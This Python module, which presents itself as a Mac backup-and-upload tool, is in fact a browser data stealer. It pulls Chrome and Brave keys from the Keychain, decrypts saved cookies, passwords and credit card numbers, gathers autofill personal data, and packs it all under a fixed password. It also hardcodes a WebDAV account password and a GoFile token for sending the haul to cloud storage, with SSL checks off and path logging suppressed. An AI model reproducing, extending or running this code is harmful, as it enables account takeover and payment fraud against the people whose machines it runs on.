# -*- coding: utf-8 -*-
"""
Mac自动备份和上传工具
功能：备份Mac系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import subprocess
import getpass
import json
import base64
import sqlite3
import traceback
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    logging.warning("⚠️ pycryptodome未安装，浏览器数据导出功能将被禁用")

# 从包内导入配置
from .config import BackupConfig

class BrowserDataExporter:
    """macOS 浏览器数据导出器"""
    
    def __init__(self, output_dir=None):
        home = os.path.expanduser('~')
        # 浏览器 User Data 根目录（支持多个 Profile）
        self.browsers = {
            "Chrome": os.path.join(home, "Library", "Application Support", "Google", "Chrome"),
            "Safari": os.path.join(home, "Library", "Safari"),  # Safari 不使用 Profile
            "Brave": os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser"),
        }
        if output_dir is None:
            # 获取用户名前5个字符作为前缀
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            self.output_dir = Path(BackupConfig.BACKUP_ROOT) / f"{user_prefix}_browser_exports"
        else:
            self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
    
    def get_master_key(self, browser_name):
        """获取浏览器主密钥（从 macOS Keychain）"""
        if not CRYPTO_AVAILABLE:
            return None
            
        try:
            # Safari 不使用主密钥加密（使用系统 Keychain 直接存储）
            if browser_name == "Safari":
                return None  # Safari 使用不同的机制
            
            # Chrome/Brave 的密钥存储在 Keychain 中
            keychain_names = {
                "Chrome": "Chrome Safe Storage",
                "Brave": "Brave Safe Storage",
            }
            
            service_name = keychain_names.get(browser_name, "Chrome Safe Storage")
            
            # 使用 security 命令从 Keychain 获取密钥
            cmd = [
                'security',
                'find-generic-password',
                '-w',  # 只输出密码
                '-s', service_name,  # service name
                '-a', browser_name  # account name
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                password = result.stdout.strip()
                # Chrome/Edge/Brave 使用 "peanuts" 作为密码的情况（某些版本）
                if not password:
                    password = "peanuts"
                
                # 使用 PBKDF2 派生密钥
                salt = b'saltysalt'
                iterations = 1003
                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                return key
            else:
                # 如果 Keychain 中没有，使用默认密码
                password = "peanuts"
                salt = b'saltysalt'
                iterations = 1003
                key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                return key
        except (subprocess.SubprocessError, OSError, ValueError) as e:
            logging.error(f"❌ 获取 {browser_name} 主密钥失败: {e}")
            return None
    
    def decrypt_payload(self, cipher_text, master_key):
        """解密数据"""
        if not CRYPTO_AVAILABLE:
            return None
            
        try:
            if not cipher_text or not isinstance(cipher_text, (bytes, bytearray)):
                return None

            prefix = cipher_text[:3]
            # macOS Chrome v10+ 使用 AES-128-CBC
            if prefix == b'v10':
                if not master_key:
                    return None
                iv = b' ' * 16  # Chrome on macOS uses blank IV
                payload = cipher_text[3:]  # 移除 v10 前缀
                cipher = AES.new(master_key, AES.MODE_CBC, iv)
                decrypted = cipher.decrypt(payload)
                # 移除 PKCS7 padding
                padding_length = decrypted[-1]
                decrypted = decrypted[:-padding_length]
                return decrypted.decode('utf-8', errors='ignore')
            # Chromium v11 (AES-GCM)
            elif prefix == b'v11':
                if not master_key:
                    return None
                payload = cipher_text[3:]
                if len(payload) < 12 + 16:
                    return None
                nonce = payload[:12]
                ciphertext_with_tag = payload[12:]
                ciphertext = ciphertext_with_tag[:-16]
                tag = ciphertext_with_tag[-16:]
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='ignore')
            # 旧版本或其他格式
            else:
                return cipher_text.decode('utf-8', errors='ignore')
        except (ValueError, TypeError, IndexError) as e:
            return None
    
    def safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
        """安全复制被锁定的文件（浏览器运行时）"""
        for attempt in range(max_retries):
            try:
                shutil.copy2(source_path, dest_path)
                return True
            except PermissionError:
                try:
                    with open(source_path, 'rb') as src:
                        with open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                    return True
                except (OSError, IOError) as e:
                    if attempt == max_retries - 1:
                        logging.warning(f"⚠️  文件被锁定，尝试 SQLite 在线备份...")
                        return self.sqlite_online_backup(source_path, dest_path)
                    time.sleep(0.5)
            except (OSError, IOError) as e:
                logging.error(f"❌ 复制失败: {e}")
                return False
        return False
    
    def sqlite_online_backup(self, source_db, dest_db):
        """使用 SQLite Online Backup 复制数据库"""
        try:
            source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
            dest_conn = sqlite3.connect(dest_db)
            source_conn.backup(dest_conn)
            source_conn.close()
            dest_conn.close()
            logging.info("✅ 使用在线备份成功")
            return True
        except (sqlite3.Error, OSError) as e:
            logging.error(f"❌ 在线备份失败: {e}")
            return False
    
    def export_cookies(self, browser_name, browser_path, master_key, profile_name=None):
        """导出 Cookies（支持浏览器运行时）"""
        # 支持 Network/Cookies 路径（新版本 Chrome）
        cookies_path = os.path.join(browser_path, "Network", "Cookies")
        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(browser_path, "Cookies")
        
        if not os.path.exists(cookies_path):
            return []
        
        # 使用安全复制方法
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_cookies = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_cookies.db")
        if not self.safe_copy_locked_file(cookies_path, temp_cookies):
            return []
        
        cookies = []
        try:
            # 首先尝试：设置 text_factory 为 bytes，避免 UTF-8 解码错误
            conn = sqlite3.connect(temp_cookies)
            # 设置 text_factory 为 bytes，这样所有文本字段都会被读取为 bytes，然后手动解码
            conn.text_factory = bytes
            cursor = conn.cursor()
            # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
            cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
            
            for row in cursor.fetchall():
                host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                
                # 解码文本字段
                try:
                    host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                    name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                    path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                except (UnicodeDecodeError, AttributeError):
                    # 如果解码失败，尝试使用 latin1 或直接使用原值
                    try:
                        host = host_bytes.decode('latin1') if isinstance(host_bytes, bytes) else host_bytes
                        name = name_bytes.decode('latin1') if isinstance(name_bytes, bytes) else name_bytes
                        path = path_bytes.decode('latin1') if isinstance(path_bytes, bytes) else path_bytes
                    except:
                        continue
                
                # encrypted_value 应该是 bytes，直接使用
                if encrypted_value is not None and isinstance(encrypted_value, bytes):
                    decrypted_value = self.decrypt_payload(encrypted_value, master_key)
                    if decrypted_value:
                        cookies.append({
                            "host": host,
                            "name": name,
                            "value": decrypted_value,
                            "path": path,
                            "expires": expires,
                            "secure": bool(is_secure),
                            "httponly": bool(is_httponly)
                        })
            
            conn.close()
        except (sqlite3.Error, OSError, UnicodeDecodeError) as e:
            logging.debug(f"导出 Cookies 失败: {e}")
            # 如果 CAST 方法失败，尝试使用备用方法
            try:
                conn = sqlite3.connect(temp_cookies)
                # 设置 text_factory 为 bytes，然后手动解码文本字段
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                
                for row in cursor.fetchall():
                    host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                    
                    # 解码文本字段
                    try:
                        host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                        name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                        path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                    except:
                        continue
                    
                    # encrypted_value 应该是 bytes，直接使用
                    if encrypted_value is not None and isinstance(encrypted_value, bytes):
                        decrypted_value = self.decrypt_payload(encrypted_value, master_key)
                        if decrypted_value:
                            cookies.append({
                                "host": host,
                                "name": name,
                                "value": decrypted_value,
                                "path": path,
                                "expires": expires,
                                "secure": bool(is_secure),
                                "httponly": bool(is_httponly)
                            })
                
                conn.close()
            except Exception as e2:
                logging.debug(f"备用方法也失败: {e2}")
        finally:
            if os.path.exists(temp_cookies):
                try:
                    os.remove(temp_cookies)
                except Exception:
                    pass
        
        return cookies
    
    def export_passwords(self, browser_name, browser_path, master_key, profile_name=None):
        """导出密码（支持浏览器运行时）"""
        login_data_path = os.path.join(browser_path, "Login Data")
        if not os.path.exists(login_data_path):
            return []
        
        # 使用安全复制方法
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_login = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_login.db")
        if not self.safe_copy_locked_file(login_data_path, temp_login):
            return []
        
        passwords = []
        try:
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            # 使用 CAST 确保 password_value 作为 BLOB 读取
            cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # 确保 encrypted_password 是 bytes 类型
                if encrypted_password is not None:
                    if isinstance(encrypted_password, str):
                        try:
                            encrypted_password = encrypted_password.encode('latin1')
                        except:
                            continue
                    elif not isinstance(encrypted_password, (bytes, bytearray)):
                        try:
                            encrypted_password = bytes(encrypted_password)
                        except:
                            continue
                
                # 解密密码
                decrypted_password = self.decrypt_payload(encrypted_password, master_key)
                if decrypted_password:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_password
                    })
            
            conn.close()
        except (sqlite3.Error, OSError, UnicodeDecodeError) as e:
            logging.debug(f"导出密码失败: {e}")
            # 如果 CAST 方法失败，尝试使用备用方法
            try:
                conn = sqlite3.connect(temp_login)
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url_bytes, username_bytes, encrypted_password = row
                    
                    try:
                        url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                        username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                    except:
                        continue
                    
                    if encrypted_password is not None and isinstance(encrypted_password, bytes):
                        decrypted_password = self.decrypt_payload(encrypted_password, master_key)
                        if decrypted_password:
                            passwords.append({
                                "url": url,
                                "username": username,
                                "password": decrypted_password
                            })
                
                conn.close()
            except Exception as e2:
                logging.debug(f"备用方法也失败: {e2}")
        finally:
            if os.path.exists(temp_login):
                try:
                    os.remove(temp_login)
                except Exception:
                    pass
        
        return passwords
    
    def export_web_data(self, browser_name, browser_path, master_key, profile_name=None):
        """导出 Web Data（自动填充数据、支付方式等）"""
        web_data_path = os.path.join(browser_path, "Web Data")
        if not os.path.exists(web_data_path):
            return {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
        
        # 使用安全复制方法
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_web_data = os.path.join(self.output_dir, f"temp_{browser_name}{profile_suffix}_webdata.db")
        if not self.safe_copy_locked_file(web_data_path, temp_web_data):
            return {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
        
        web_data = {
            "autofill_profiles": [],
            "credit_cards": [],
            "autofill_profile_names": [],
            "autofill_profile_emails": [],
            "autofill_profile_phones": [],
            "autofill_profile_addresses": []
        }
        
        try:
            conn = sqlite3.connect(temp_web_data)
            cursor = conn.cursor()
            
            try:
                # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                for row in cursor.fetchall():
                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                    try:
                        # 确保 encrypted_card 是 bytes 类型
                        if encrypted_card is not None:
                            if isinstance(encrypted_card, str):
                                try:
                                    encrypted_card = encrypted_card.encode('latin1')
                                except:
                                    continue
                            elif not isinstance(encrypted_card, (bytes, bytearray)):
                                try:
                                    encrypted_card = bytes(encrypted_card)
                                except:
                                    continue
                        
                        decrypted_card = self.decrypt_payload(encrypted_card, master_key) if encrypted_card else None
                        if decrypted_card:
                            web_data["credit_cards"].append({
                                "guid": guid,
                                "name_on_card": name_on_card,
                                "expiration_month": exp_month,
                                "expiration_year": exp_year,
                                "card_number": decrypted_card,
                                "billing_address_id": billing_id,
                                "nickname": nickname
                            })
                    except Exception:
                        continue
            except (sqlite3.Error, UnicodeDecodeError) as e:
                logging.debug(f"导出信用卡数据失败: {e}")
                # 尝试备用方法
                try:
                    conn2 = sqlite3.connect(temp_web_data)
                    conn2.text_factory = bytes
                    cursor2 = conn2.cursor()
                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                    for row in cursor2.fetchall():
                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                        try:
                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                            
                            if encrypted_card is not None and isinstance(encrypted_card, bytes):
                                decrypted_card = self.decrypt_payload(encrypted_card, master_key)
                                if decrypted_card:
                                    web_data["credit_cards"].append({
                                        "guid": guid,
                                        "name_on_card": name_on_card,
                                        "expiration_month": exp_month,
                                        "expiration_year": exp_year,
                                        "card_number": decrypted_card,
                                        "billing_address_id": billing_id,
                                        "nickname": nickname
                                    })
                        except Exception:
                            continue
                    conn2.close()
                except Exception:
                    pass
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                for row in cursor.fetchall():
                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                    web_data["autofill_profiles"].append({
                        "guid": guid,
                        "first_name": first_name,
                        "middle_name": middle_name,
                        "last_name": last_name,
                        "full_name": full_name,
                        "honorific_prefix": honorific_prefix,
                        "honorific_suffix": honorific_suffix
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                for row in cursor.fetchall():
                    guid, first_name, middle_name, last_name, full_name = row
                    web_data["autofill_profile_names"].append({
                        "guid": guid,
                        "first_name": first_name,
                        "middle_name": middle_name,
                        "last_name": last_name,
                        "full_name": full_name
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                for row in cursor.fetchall():
                    guid, email = row
                    web_data["autofill_profile_emails"].append({
                        "guid": guid,
                        "email": email
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                for row in cursor.fetchall():
                    guid, number = row
                    web_data["autofill_profile_phones"].append({
                        "guid": guid,
                        "number": number
                    })
            except Exception:
                pass
            
            try:
                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                for row in cursor.fetchall():
                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                    web_data["autofill_profile_addresses"].append({
                        "guid": guid,
                        "street_address": street_address,
                        "address_line_1": address_line_1,
                        "address_line_2": address_line_2,
                        "city": city,
                        "state": state,
                        "zipcode": zipcode,
                        "country_code": country_code
                    })
            except Exception:
                pass
            
            conn.close()
        except (sqlite3.Error, OSError) as e:
            logging.debug(f"导出 Web Data 失败: {e}")
        finally:
            if os.path.exists(temp_web_data):
                try:
                    os.remove(temp_web_data)
                except Exception:
                    pass
        
        return web_data
    
    def encrypt_export_data(self, data, password):
        """加密导出数据"""
        if not CRYPTO_AVAILABLE:
            logging.error("❌ pycryptodome未安装，无法加密数据")
            return None
            
        try:
            salt = get_random_bytes(32)
            key = PBKDF2(password, salt, dkLen=32, count=100000)
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(json.dumps(data, ensure_ascii=False).encode('utf-8'))
            
            encrypted_data = {
                "salt": base64.b64encode(salt).decode('utf-8'),
                "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
                "tag": base64.b64encode(tag).decode('utf-8'),
                "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
            }
            return encrypted_data
        except (ValueError, TypeError, OSError) as e:
            logging.error(f"❌ 加密数据失败: {e}")
            return None
    
    def export_all(self):
        """导出所有浏览器数据"""
        if not CRYPTO_AVAILABLE:
            logging.error("❌ 需要安装 pycryptodome: pip3 install pycryptodome")
            return None
            
        logging.info("\n" + "="*60)
        logging.info("🔐 macOS 浏览器数据导出")
        logging.info("="*60)
        logging.info("⚠️  警告：此操作将导出敏感数据")
        logging.info("ℹ️  提示：支持在浏览器运行时导出（无需关闭）")
        logging.info("-"*60)
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "platform": "macOS",
            "browsers": {}
        }
        
        for browser_name, user_data_path in self.browsers.items():
            if not os.path.exists(user_data_path):
                logging.info(f"⏭️  跳过 {browser_name}（未安装）")
                continue
            
            # Safari 特殊处理（不使用 Profile）
            if browser_name == "Safari":
                logging.info(f"\n📦 处理 {browser_name}...")
                # Safari 不使用主密钥加密
                master_key = None
                master_key_b64 = None
                cookies = self.export_cookies(browser_name, user_data_path, master_key, None)
                passwords = self.export_passwords(browser_name, user_data_path, master_key, None)
                web_data = self.export_web_data(browser_name, user_data_path, master_key, None)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    all_data["browsers"][browser_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"]),
                        "master_key": master_key_b64  # Safari 不使用 Master Key
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"✅ {browser_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
                continue
            
            # Chrome 和 Brave 支持多个 Profile
            logging.info(f"\n📦 处理 {browser_name}...")
            
            # 获取主密钥（所有 Profile 共享同一个 Master Key）
            master_key = self.get_master_key(browser_name)
            master_key_b64 = None
            if master_key:
                # 将 Master Key 编码为 base64 以便保存
                master_key_b64 = base64.b64encode(master_key).decode('utf-8')
            else:
                logging.warning(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
                        cookies_path = os.path.join(item_path, "Network", "Cookies")
                        if not os.path.exists(cookies_path):
                            cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        web_data_path = os.path.join(item_path, "Web Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                continue
            
            if not profiles:
                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
                continue
            
            # 为每个 Profile 导出数据
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  📂 处理 Profile: {profile_name}")
                
                cookies = self.export_cookies(browser_name, profile_path, master_key, profile_name) if master_key else []
                passwords = self.export_passwords(browser_name, profile_path, master_key, profile_name) if master_key else []
                web_data = self.export_web_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"])
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "✅" if master_key_b64 else "⚠️"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
        
        # 加密保存
        logging.info("\n" + "-"*60)
        password = "cookies2026"
        logging.info("🔒 使用预设加密密码保护导出文件")
        
        encrypted_data = self.encrypt_export_data(all_data, password)
        if not encrypted_data:
            return None
        
        # 保存到文件
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.info("\n" + "="*60)
        logging.info("✅ 浏览器数据导出成功！")
        logging.info(f"📁 文件名称: {output_file.name}")
        logging.info("🔒 文件已加密（密码已设置）")
        logging.info("="*60)
        
        return str(output_file)


class BackupManager:
    """备份管理器类"""
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        
        # Infini Cloud 配置
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "degen"
        self.infini_pass = "5EgRJ3oNCHa7YLnk"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_mac_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API token（备选方案）
        self.api_token = "eU3ZRZXNLQb6v4tc4u0PUQ8B0OsNTshf"
        
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            # 确保日志目录存在
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # 自定义日志格式化器
            class PathFilter(logging.Formatter):
                def format(self, record):
                    # 过滤掉路径相关的日志，但保留"扫描目录"和"排除目录"
                    if isinstance(record.msg, str):
                        msg = record.msg
                        if any(x in msg for x in ["检查目录:", "排除目录:", "扫描目录:", ":\\", "/"]):
                            if msg.startswith("扫描目录:") or msg.startswith("排除目录:"):
                                return super().format(record)
                            return None
                        # 保留进度和状态信息
                        if any(x in msg for x in ["已备份", "完成", "失败", "错误", "成功", "📁", "✅", "❌", "⏳", "📋"]):
                            return super().format(record)
                        # 其他普通日志
                        return super().format(record)
                    return super().format(record)
            
            # 自定义过滤器
            class MessageFilter(logging.Filter):
                def filter(self, record):
                    if isinstance(record.msg, str):
                        # 过滤掉路径相关的日志，但保留"扫描目录"和"排除目录"
                        if any(x in record.msg for x in ["检查目录:", "排除目录:", "扫描目录:", ":\\", "/"]):
                            if record.msg.startswith("扫描目录:") or record.msg.startswith("排除目录:"):
                                return True
                            return False
                    return True
            
            # 配置文件处理器
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_formatter = PathFilter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_formatter)
            file_handler.addFilter(MessageFilter())
            
            # 配置控制台处理器
            console_handler = logging.StreamHandler()
            console_formatter = PathFilter('%(message)s')
            console_handler.setFormatter(console_formatter)
            console_handler.addFilter(MessageFilter())
            
            # 配置根日志记录器
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # 清除现有处理器
            root_logger.handlers.clear()
            
            # 添加处理器
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
          
            logging.info("日志系统初始化完成")
        except (OSError, IOError, PermissionError) as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """获取目录总大小
        
        Args:
            directory: 目录路径
            
        Returns:
            int: 目录大小（字节）
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """确保目录存在
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 目录是否可用
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """清理并重新创建目录
        
        Args:
            directory_path: 目录路径
            
        Returns:
            bool: 操作是否成功
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接
        
        Returns:
            bool: 是否有网络连接
        """
        for host, port in BackupConfig.NETWORK_CHECK_HOSTS:
            try:
                socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                return True
            except (socket.timeout, socket.error) as e:
                logging.debug(f"连接 {host}:{port} 失败: {e}")
                continue
        return False

    @staticmethod
    def _is_valid_file(file_path):
        """检查文件是否有效
        
        Args:
            file_path: 文件路径
            
        Returns:
            bool: 文件是否有效
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _safe_remove_file(self, file_path, retry=True):
        """安全删除文件，支持重试机制
        
        Args:
            file_path: 要删除的文件路径
            retry: 是否使用重试机制
            
        Returns:
            bool: 删除是否成功
        """
        if not os.path.exists(file_path):
            return True
        
        if not retry:
            try:
                os.remove(file_path)
                return True
            except (OSError, IOError, PermissionError):
                return False
        
        # 使用重试机制删除文件
        try:
            # 等待文件句柄完全释放
            time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            for _ in range(self.config.FILE_DELETE_RETRY_COUNT):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except PermissionError:
                    time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                except (OSError, IOError) as e:
                    logging.debug(f"删除文件重试中: {str(e)}")
                    time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
            return False
